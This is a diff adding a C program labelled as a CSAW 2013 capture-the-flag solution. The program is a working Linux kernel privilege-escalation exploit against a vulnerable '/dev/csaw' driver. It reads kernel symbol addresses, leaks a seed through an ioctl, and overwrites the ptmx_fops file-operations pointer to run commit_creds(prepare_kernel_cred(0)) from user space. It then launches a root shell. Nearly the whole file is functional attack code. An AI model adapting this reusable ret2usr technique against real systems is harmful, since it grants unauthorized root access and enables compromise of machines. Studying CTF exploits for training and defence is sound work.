@@ -1,0 +1,278 @@
+/*
+ * CSAW 2013 Michael Coppola solution
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/uio.h>
+#include <sys/utsname.h>
+
+#define BUF_SIZE 0x100
+
+#define CSAW_IOCTL_BASE     0x77617363
+#define CSAW_ALLOC_HANDLE   CSAW_IOCTL_BASE+1
+#define CSAW_READ_HANDLE    CSAW_IOCTL_BASE+2
+#define CSAW_WRITE_HANDLE   CSAW_IOCTL_BASE+3
+#define CSAW_GET_CONSUMER   CSAW_IOCTL_BASE+4
+#define CSAW_SET_CONSUMER   CSAW_IOCTL_BASE+5
+#define CSAW_FREE_HANDLE    CSAW_IOCTL_BASE+6
+#define CSAW_GET_STATS      CSAW_IOCTL_BASE+7
+
+struct alloc_args {
+    unsigned long size;
+    unsigned long handle;
+};
+
+struct free_args {
+    unsigned long handle;
+};
+
+struct read_args {
+    unsigned long handle;
+    unsigned long size;
+    void *out;
+};
+
+struct write_args {
+    unsigned long handle;
+    unsigned long size;
+    void *in;
+};
+
+struct consumer_args {
+    unsigned long handle;
+    unsigned long pid;
+    unsigned char offset;
+};
+
+struct csaw_stats {
+    unsigned long clients;
+    unsigned long handles;
+    unsigned long bytes_read;
+    unsigned long bytes_written;
+    char version[40];
+};
+
+/* thanks spender... */
+unsigned long get_kernel_sym(char *name)
+{
+        FILE *f;
+        unsigned long addr;
+        char dummy;
+        char sname[512];
+        struct utsname ver;
+        int ret;
+        int rep = 0;
+        int oldstyle = 0;
+
+        f = fopen("/proc/kallsyms", "r");
+        if (f == NULL) {
+                f = fopen("/proc/ksyms", "r");
+                if (f == NULL)
+                        goto fallback;
+                oldstyle = 1;
+        }
+
+repeat:
+        ret = 0;
+        while(ret != EOF) {
+                if (!oldstyle)
+                        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
+                else {
+                        ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
+                        if (ret == 2) {
+                                char *p;
+                                if (strstr(sname, "_O/") || strstr(sname, "_S."))
+                                        continue;
+                                p = strrchr(sname, '_');
+                                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
+                                        p = p - 4;
+                                        while (p > (char *)sname && *(p - 1) == '_')
+                                                p--;
+                                        *p = '\0';
+                                }
+                        }
+                }
+                if (ret == 0) {
+                        fscanf(f, "%s\n", sname);
+                        continue;
+                }
+                if (!strcmp(name, sname)) {
+                        fprintf(stdout, "[+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
+                        fclose(f);
+                        return addr;
+                }
+        }
+
+        fclose(f);
+        if (rep)
+                return 0;
+fallback:
+        uname(&ver);
+        if (strncmp(ver.release, "2.6", 3))
+                oldstyle = 1;
+        sprintf(sname, "/boot/System.map-%s", ver.release);
+        f = fopen(sname, "r");
+        if (f == NULL)
+                return 0;
+        rep = 1;
+        goto repeat;
+}
+
+typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
+
+unsigned long commit_creds;
+unsigned long prepare_kernel_cred;
+unsigned long *cleanup;
+
+int get_root ( void *iocb, const struct iovec *iov, unsigned long nr_segs, loff_t pos )
+{
+    _commit_creds commit = (_commit_creds)commit_creds;
+    _prepare_kernel_cred prepare = (_prepare_kernel_cred)prepare_kernel_cred;
+
+    *cleanup = 0;
+
+    commit(prepare(0));
+
+    return 0;
+}
+
+int main ( int argc, char **argv )
+{
+    int fd, pfd, ret;
+    unsigned long handle, buf, seed, target, new_handle, ptmx_fops;
+    unsigned long payload[4];
+    struct alloc_args alloc_args;
+    struct write_args write_args;
+    struct consumer_args consumer_args;
+    struct iovec iov;
+
+    fd = open("/dev/csaw", O_RDONLY);
+    if ( fd < 0 )
+    {
+        perror("open");
+        exit(EXIT_FAILURE);
+    }
+
+    pfd = open("/dev/ptmx", O_RDWR);
+    if ( pfd < 0 )
+    {
+        perror("open");
+        exit(EXIT_FAILURE);
+    }
+
+    commit_creds = get_kernel_sym("commit_creds");
+    if ( ! commit_creds )
+    {
+        printf("[-] commit_creds symbol not found, aborting\n");
+        exit(1);
+    }
+
+    prepare_kernel_cred = get_kernel_sym("prepare_kernel_cred");
+    if ( ! prepare_kernel_cred )
+    {
+        printf("[-] prepare_kernel_cred symbol not found, aborting\n");
+        exit(1);
+    }
+
+    ptmx_fops = get_kernel_sym("ptmx_fops");
+    if ( ! ptmx_fops )
+    {
+        printf("[-] ptmx_fops symbol not found, aborting\n");
+        exit(1);
+    }
+
+    memset(&alloc_args, 0, sizeof(alloc_args));
+    alloc_args.size = BUF_SIZE;
+
+    ret = ioctl(fd, CSAW_ALLOC_HANDLE, &alloc_args);
+    if ( ret < 0 )
+    {
+        perror("ioctl");
+        exit(EXIT_FAILURE);
+    }
+
+    handle = alloc_args.handle;
+
+    printf("[+] Acquired handle: %lx\n", handle);
+
+    memset(&consumer_args, 0, sizeof(consumer_args));
+    consumer_args.handle = handle;
+    consumer_args.offset = 255;
+
+    ret = ioctl(fd, CSAW_GET_CONSUMER, &consumer_args);
+    if ( ret < 0 )
+    {
+        perror("ioctl");
+        exit(EXIT_FAILURE);
+    }
+
+    buf = consumer_args.pid;
+
+    printf("[+] buf = %lx\n", buf);
+
+    seed = buf ^ handle;
+
+    printf("[+] seed = %lx\n", seed);
+
+    target = ptmx_fops + sizeof(void *) * 4;
+
+    printf("[+] target = %lx\n", target);
+
+    new_handle = target ^ seed;
+
+    printf("[+] new handle = %lx\n", new_handle);
+
+    memset(&consumer_args, 0, sizeof(consumer_args));
+    consumer_args.handle = handle;
+    consumer_args.offset = 255;
+    consumer_args.pid = target;
+
+    ret = ioctl(fd, CSAW_SET_CONSUMER, &consumer_args);
+    if ( ret < 0 )
+    {
+        perror("ioctl");
+        exit(EXIT_FAILURE);
+    }
+
+    buf = (unsigned long)&get_root;
+
+    memset(&write_args, 0, sizeof(write_args));
+    write_args.handle = new_handle;
+    write_args.size = sizeof(buf);
+    write_args.in = &buf;
+
+    ret = ioctl(fd, CSAW_WRITE_HANDLE, &write_args);
+    if ( ret < 0 )
+    {
+        perror("ioctl");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("[+] Triggering payload\n");
+
+    cleanup = (unsigned long *)target;
+
+    iov.iov_base = &iov;
+    iov.iov_len = sizeof(payload);
+    ret = readv(pfd, &iov, 1);
+
+    if ( getuid() )
+    {
+        printf("[-] Failed to get root\n");
+        exit(1);
+    }
+    else
+        printf("[+] Got root!\n");
+
+    printf("[+] Enjoy your shell...\n");
+    execl("/bin/sh", "sh", NULL);
+
+    return 0;
+}
